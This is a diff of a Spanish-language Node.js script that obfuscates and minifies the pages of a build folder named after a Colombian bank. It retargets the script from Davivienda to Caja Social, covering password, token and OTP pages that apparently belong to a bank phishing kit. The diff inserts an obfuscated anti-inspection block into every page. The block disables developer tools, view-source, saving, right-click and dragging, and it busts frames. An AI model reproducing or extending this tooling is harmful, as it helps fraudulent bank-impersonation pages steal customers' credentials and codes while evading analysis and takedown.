@@ -1,6 +1,6 @@
 /* ============================================
-   OFUSCAR DAVIVIENDA
-   Ofusca HTML + CSS + JS de la carpeta davivienda-build
+   OFUSCAR CAJA SOCIAL + ANTI-INSPECCIÓN
+   Ofusca HTML + CSS + JS y agrega anti-inspección
    ============================================ */
 
 const fs = require('fs');
@@ -12,7 +12,7 @@ const CleanCSS = require('clean-css');
 // ============================================
 // CONFIGURACIÓN
 // ============================================
-const CARPETA = path.join(__dirname, 'davivienda-build');
+const CARPETA = path.join(__dirname, 'caja-social-build');
 
 // Configuración del ofuscador JS
 const CONFIG_JS = {
@@ -48,6 +48,36 @@ const CONFIG_JS = {
 };
 
 // ============================================
+// BLOQUE ANTI-INSPECCIÓN
+// ============================================
+const BLOQUE_ANTI = `
+<script>
+(function(){
+'use strict';
+var _0xa1=0;
+document.addEventListener('touchend',function(_0xb2){
+var _0xc3=new Date().getTime();
+if(_0xc3-_0xa1<=300){_0xb2.preventDefault();}
+_0xa1=_0xc3;
+},{passive:false});
+document.addEventListener('dblclick',function(_0xd4){_0xd4.preventDefault();});
+document.addEventListener('contextmenu',function(_0xe5){_0xe5.preventDefault();return false;});
+document.addEventListener('keydown',function(_0xf6){
+var _0xg7=(_0xf6.key||'').toLowerCase();
+var _0xh8=_0xf6.ctrlKey||_0xf6.metaKey;
+var _0xi9=_0xf6.shiftKey;
+if(_0xg7==='f12'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xi9&&(_0xg7==='i'||_0xg7==='j'||_0xg7==='c')){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='u'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='s'){_0xf6.preventDefault();return false;}
+});
+document.addEventListener('dragstart',function(_0xj0){_0xj0.preventDefault();});
+try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xk1){document.body.innerHTML='';}
+})();
+</script>
+`;
+
+// ============================================
 // FUNCIONES
 // ============================================
 function ofuscarJS(archivo) {
@@ -75,7 +105,18 @@ async function minificarHTML(archivo) {
     }
 
     try {
-        const codigo = fs.readFileSync(ruta, 'utf8');
+        let codigo = fs.readFileSync(ruta, 'utf8');
+
+        // 1. Insertar anti-inspección antes de </body> si no existe
+        if (codigo.indexOf('_0xa1=0') === -1) {
+            if (codigo.indexOf('</body>') !== -1) {
+                codigo = codigo.replace('</body>', BLOQUE_ANTI + '</body>');
+            } else {
+                codigo += BLOQUE_ANTI;
+            }
+        }
+
+        // 2. Minificar
         const resultado = await minifyHTML(codigo, {
             collapseWhitespace: true,
             removeComments: true,
@@ -114,29 +155,28 @@ function minificarCSS(archivo) {
 // EJECUTAR
 // ============================================
 async function main() {
-    console.log('\n🔒 OFUSCANDO DAVIVIENDA\n');
+    console.log('\n🔒 OFUSCANDO CAJA SOCIAL + ANTI-INSPECCIÓN\n');
 
-    // Ofuscar JS
-    console.log('📄 Ofuscando JavaScript:');
-    ofuscarJS('login.js');
-    ofuscarJS('token.js');
-    ofuscarJS('otp.js');
-    ofuscarJS('espera.js');
-
-    // Minificar HTML
-    console.log('\n📄 Minificando HTML:');
+    // Minificar HTML + insertar anti-inspección
+    console.log('📄 Minificando HTML + agregando anti-inspección:');
     await minificarHTML('index.html');
-    await minificarHTML('login.html');
+    await minificarHTML('password.html');
     await minificarHTML('token.html');
     await minificarHTML('otp.html');
-    await minificarHTML('espera.html');
 
     // Minificar CSS
     console.log('\n📄 Minificando CSS:');
     minificarCSS('styles.css');
-    minificarCSS('login.css');
 
-    console.log('\n✅ DAVIVIENDA OFUSCADO CORRECTAMENTE\n');
+    console.log('\n✅ CAJA SOCIAL OFUSCADO + PROTEGIDO CORRECTAMENTE\n');
+    console.log('🔒 Anti-inspección activado:');
+    console.log('   ❌ F12 bloqueado');
+    console.log('   ❌ Ctrl+Shift+I bloqueado');
+    console.log('   ❌ Ctrl+U bloqueado');
+    console.log('   ❌ Ctrl+S bloqueado');
+    console.log('   ❌ Click derecho bloqueado');
+    console.log('   ❌ Arrastrar bloqueado');
+    console.log('   ❌ Iframes bloqueados\n');
 }
 
 main();
